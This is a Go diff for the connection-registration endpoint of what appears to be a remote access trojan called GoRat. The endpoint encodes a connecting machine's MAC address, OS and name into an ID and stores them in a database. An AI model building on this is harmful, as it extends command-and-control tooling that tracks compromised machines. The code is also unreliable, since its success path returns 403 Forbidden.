@@ -1,16 +1,22 @@
 package endpoints
 
 import (
+	"encoding/base64"
 	"encoding/json"
-	"fmt"
 	"net/http"
-	
+
+	"github.com/NotKatsu/GoRat/database"
+
 	"github.com/pterm/pterm"
 )
 
 type Error struct {
 	ErrorCode    uint64 `json:"error_code"`
 	ErrorMessage string `json:"error_message"`
+}
+
+type ConnectionSuccess struct {
+	ID string `json:"ID"`
 }
 
 func ConnectionNew(w http.ResponseWriter, r *http.Request) {
@@ -39,7 +45,46 @@ func ConnectionNew(w http.ResponseWriter, r *http.Request) {
 				}
 			}
 		} else {
-			fmt.Println("Everything is all good.")
+			CustomID := base64.StdEncoding.EncodeToString([]byte(MACAddress)) + "." + base64.StdEncoding.EncodeToString([]byte(OS)) + "." + base64.StdEncoding.EncodeToString([]byte(Name))
+
+			if database.ConnectionNew(CustomID, MACAddress, OS, Name) == false {
+				NewError := Error{
+					ErrorCode:    http.StatusForbidden,
+					ErrorMessage: "A database error occured while trying to insert the document.",
+				}
+
+				w.WriteHeader(http.StatusForbidden)
+
+				NewReturnError, err := json.Marshal(NewError)
+
+				if err != nil {
+					pterm.Fatal.WithFatal(true).Println(err)
+				} else {
+					_, err := w.Write(NewReturnError)
+
+					if err != nil {
+						pterm.Fatal.WithFatal(true).Println(err)
+					}
+				}
+			} else {
+				ConnectionSuccessJson := ConnectionSuccess{
+					ID: CustomID,
+				}
+
+				w.WriteHeader(http.StatusForbidden)
+
+				NewConnectionSuccessJson, err := json.Marshal(ConnectionSuccessJson)
+
+				if err != nil {
+					pterm.Fatal.WithFatal(true).Println(err)
+				} else {
+					_, err := w.Write(NewConnectionSuccessJson)
+
+					if err != nil {
+						pterm.Fatal.WithFatal(true).Println(err)
+					}
+				}
+			}
 		}
 
 	} else {
